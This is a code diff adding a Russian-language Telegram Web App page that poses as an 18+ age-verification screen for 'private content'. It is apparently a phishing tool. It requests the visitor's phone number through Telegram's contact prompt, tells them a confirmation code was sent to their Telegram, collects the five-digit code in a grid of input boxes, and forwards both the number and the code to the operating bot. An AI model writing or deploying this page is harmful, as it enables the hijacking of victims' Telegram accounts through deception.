@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Подтверждение 18+</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body {
+            margin: 0; padding: 0; height: 100vh;
+            background: linear-gradient(135deg, #1a1a1a, #000);
+            color: white; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; text-align: center;
+            padding: 20px;
+        }
+        .logo { font-size: 60px; margin-bottom: 20px; }
+        .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+        .subtitle { font-size: 14px; color: #aaa; margin-bottom: 40px; padding: 0 20px; }
+        
+        /* Стили для кнопки номера */
+        #phoneBtn {
+            background: #0088cc; color: white; border: none;
+            padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold;
+            cursor: pointer; display: none; box-shadow: 0 0 20px rgba(0,136,204,0.5);
+            transition: 0.3s; width: 100%; max-width: 300px;
+        }
+        #phoneBtn:hover { transform: scale(1.05); }
+        
+        /* Стили для ввода кода */
+        .code-container { display: none; gap: 10px; margin-top: 20px; }
+        .code-input {
+            width: 45px; height: 55px; font-size: 24px; text-align: center;
+            background: #2a2a2a; border: 1px solid #444; border-radius: 10px;
+            color: white; outline: none; transition: 0.2s;
+        }
+        .code-input:focus { border-color: #0088cc; box-shadow: 0 0 10px rgba(0,136,204,0.3); }
+        
+        /* Анимации */
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <div id="step1">
+        <div class="logo">🔞</div>
+        <div class="title">Подтверждение возраста</div>
+        <div class="subtitle">Для доступа к приватному контенту необходимо подтвердить ваш номер телефона через Telegram.</div>
+        <button id="phoneBtn" onclick="requestPhone()">📱 Поделиться номером</button>
+    </div>
+
+    <div id="step2" class="hidden">
+        <div class="logo">🔐</div>
+        <div class="title">Введите код</div>
+        <div class="subtitle">Мы отправили код подтверждения в ваш Telegram. Введите его ниже:</div>
+        
+        <div class="code-container" id="codeContainer" style="display: flex;">
+            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 0)">
+            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 1)">
+            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 2)">
+            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 3)">
+            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 4)">
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // Разворачиваем на весь экран
+
+        let userPhone = "";
+
+        // Показываем кнопку, когда API загрузится
+        window.onload = function() {
+            document.getElementById('phoneBtn').style.display = 'block';
+        };
+
+        // Запрос номера телефона через Telegram WebApp API
+        function requestPhone() {
+            tg.requestContact((success, event) => {
+                if (success) {
+                    // В event.responseUnsafe.contact.phone_number лежит номер
+                    userPhone = event.responseUnsafe.contact.phone_number;
+                    
+                    // Отправляем боту, что номер получен, и переходим к экрану кода
+                    sendDataToBot("phone", userPhone);
+                    
+                    document.getElementById('step1').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                    
+                    // Фокусируемся на первом поле ввода
+                    setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
+                }
+            });
+        }
+
+        // Логика автоперехода между ячейками кода
+        function moveNext(input, index) {
+            if (input.value.length === 1) {
+                const nextInput = document.querySelectorAll('.code-input')[index + 1];
+                if (nextInput) {
+                    nextInput.focus();
+                } else {
+                    // Если это последняя цифра, собираем код и отправляем
+                    let code = "";
+                    document.querySelectorAll('.code-input').forEach(el => code += el.value);
+                    if (code.length === 5) {
+                        sendDataToBot("code", code);
+                        // Можно показать заглушку "Загрузка..."
+                        alert("Код отправлен на проверку!");
+                    }
+                }
+            }
+        }
+
+        // Отправка данных обратно в бота
+        function sendDataToBot(type, value) {
+            // Формат данных: "type:value"
+            tg.sendData(`${type}:${value}`);
+        }
+    </script>
+</body>
+</html>
